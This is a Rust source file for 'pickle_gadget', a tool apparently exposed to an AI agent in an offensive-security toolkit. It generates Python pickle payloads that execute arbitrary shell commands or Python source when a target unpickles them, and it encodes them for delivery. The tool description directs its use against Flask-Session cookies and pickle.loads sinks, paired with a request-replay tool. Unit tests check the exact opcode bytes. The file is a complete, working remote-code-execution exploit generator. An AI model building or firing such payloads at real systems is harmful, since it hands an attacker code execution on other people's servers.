//! Python pickle RCE payload generator. Port of `src/main/mcp/tools/
//! pickle_gadget.ts`. When a target unpickles attacker data (Flask-Session with
//! the pickle serializer, a `pickle.loads` on a cookie/param, PyYAML unsafe
//! load, etc.), a crafted pickle runs an arbitrary command on load via the
//! `__reduce__` / REDUCE opcode. rever can already DELIVER bytes
//! (`replay_request` with a crafted cookie/body); this builds the payload and
//! encodes it for the delivery channel. Pure + testable: the opcode stream is
//! deterministic.

use base64::Engine as _;
use rever_tools_api::tool::{BoxFuture, Tool, ToolContext, ToolDef};
use rever_tools_api::utils::{ToolResult, ok};
use serde_json::{Value, json};

use crate::args::{text, validate};
use crate::{pretty, schema};

/// SHORT_BINSTRING (<=255) or BINSTRING push of raw bytes.
fn push_string(buf: &[u8]) -> Vec<u8> {
    if buf.len() <= 0xff {
        let mut out = vec![0x55, buf.len() as u8]; // 'U' len byte
        out.extend_from_slice(buf);
        out
    } else {
        let mut out = vec![0x54]; // 'T' 4-byte LE
        out.extend_from_slice(&(buf.len() as u32).to_le_bytes());
        out.extend_from_slice(buf);
        out
    }
}

/// pickle that runs `callable(command)` on load:
///   PROTO2, GLOBAL callable, MARK, <command>, TUPLE, REDUCE, STOP.
/// `callable` lets you swap os.system for e.g. builtins.exec (then command is
/// Python source). Default `os\nsystem` = a shell command.
pub fn build_pickle_payload(command: &str, callable: &str) -> Vec<u8> {
    let mut out = vec![0x80, 0x02]; // PROTO 2
    out.push(b'c'); // GLOBAL module\nname\n
    out.extend_from_slice(callable.as_bytes());
    out.push(b'\n');
    out.push(b'('); // MARK
    out.extend_from_slice(&push_string(command.as_bytes()));
    out.extend_from_slice(b"tR."); // TUPLE, REDUCE, STOP
    out
}

/// Encode the raw payload bytes for a delivery channel.
pub fn encode_payload(buf: &[u8], encoding: &str) -> String {
    match encoding {
        "hex" => buf.iter().map(|b| format!("{b:02x}")).collect(),
        "latin1" => buf.iter().map(|&b| char::from(b)).collect(),
        "url" => crate::common::encode_uri_component(&buf.iter().map(|&b| char::from(b)).collect::<String>()),
        // "base64" and any other value: base64.
        _ => base64::engine::general_purpose::STANDARD.encode(buf),
    }
}

const NOTE: &str = "Unpickling this runs the command. Deliver via the sink: Flask-Session pickle → set the session cookie to a value that lands this in the store the SID keys. Confirm with an out-of-band callback or a written marker, not a blind command.";

pub struct PickleGadget;

impl Tool for PickleGadget {
    fn def(&self) -> ToolDef {
        ToolDef::new(
            "pickle_gadget",
            "Build a Python pickle payload that runs a shell command when the target unpickles it (RCE via the __reduce__ opcode). Use against insecure-deserialization sinks: Flask-Session with the pickle serializer (session stored in memcached/redis/filesystem, keyed by the cookie SID — deliver via the session cookie), a param/cookie passed to pickle.loads, etc. rever delivers the bytes with replay_request (crafted cookie/body); this generates them. Returns the payload in base64/hex/url/latin1 so you can paste it into the delivery channel. callable defaults to os.system (command is a shell line); set it to \"builtins\\nexec\" to run Python source instead. For a confirmable (non-destructive) test, run a command that makes an observable out-of-band callback or writes a known marker.",
            schema(
                json!({
                    "command": {
                        "type": "string",
                        "description": "Shell command to execute on unpickle (or Python source if callable is builtins.exec)"
                    },
                    "encoding": {
                        "type": "string",
                        "enum": ["base64", "hex", "url", "latin1"],
                        "description": "Output encoding (default base64)"
                    },
                    "callable": {
                        "type": "string",
                        "description": "GLOBAL to call, as \"module\\nname\" (default \"os\\nsystem\"); e.g. \"builtins\\nexec\" for Python source"
                    }
                }),
                &["command"],
            ),
        )
    }

    fn call<'a>(&'a self, _ctx: &'a ToolContext, args: Value) -> BoxFuture<'a, ToolResult> {
        Box::pin(async move {
            if let Err(result) = validate(&self.def(), &args) {
                return result;
            }
            let command = text(&args, "command").unwrap_or_default();
            let enc = text(&args, "encoding").unwrap_or("base64");
            let callable = text(&args, "callable").unwrap_or("os\nsystem");
            let buf = build_pickle_payload(command, callable);
            ok(pretty(&json!({
                "encoding": enc,
                "payload": encode_payload(&buf, enc),
                "bytes": buf.len(),
                "note": NOTE,
            })))
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn os_system_cmd_pickle_를_결정적_opcode_로_만든다() {
        let buf = build_pickle_payload("id", "os\nsystem");
        // PROTO2 \x80\x02, GLOBAL 'cos\nsystem\n', MARK '(', SHORT_BINSTRING 'U\x02id', 'tR.'
        assert_eq!(&buf[0..2], &[0x80, 0x02]);
        assert_eq!(&buf[2..13], b"cos\nsystem\n");
        assert_eq!(&buf[13..14], b"(");
        assert_eq!(&buf[14..16], &[0x55, 0x02]); // 'U' len=2
        assert_eq!(&buf[16..18], b"id");
        assert_eq!(&buf[18..], b"tR.");
    }

    #[test]
    fn _255바이트_초과_명령은_binstring_t_4바이트_le_으로_전환() {
        let long = "a".repeat(300);
        let buf = build_pickle_payload(&long, "os\nsystem");
        let i = buf.iter().position(|&b| b == 0x54).expect("'T' opcode present"); // 'T'
        assert!(i > 0);
        let len = u32::from_le_bytes(buf[i + 1..i + 5].try_into().unwrap());
        assert_eq!(len, 300);
    }

    #[test]
    fn callable_교체_가능_builtins_exec_로_파이썬_소스_실행() {
        let buf = build_pickle_payload("print(1)", "builtins\nexec");
        let tail: String = buf[2..].iter().map(|&b| char::from(b)).collect();
        assert!(tail.starts_with("cbuiltins\nexec\n"));
    }

    #[test]
    fn base64_hex_url_latin1_인코딩() {
        let buf = build_pickle_payload("id", "os\nsystem");
        let latin1: String = buf.iter().map(|&b| char::from(b)).collect();
        assert_eq!(
            encode_payload(&buf, "base64"),
            base64::engine::general_purpose::STANDARD.encode(&buf)
        );
        assert_eq!(
            encode_payload(&buf, "hex"),
            buf.iter().map(|b| format!("{b:02x}")).collect::<String>()
        );
        assert_eq!(encode_payload(&buf, "latin1"), latin1);
        assert_eq!(
            encode_payload(&buf, "url"),
            crate::common::encode_uri_component(&latin1)
        );
    }
}
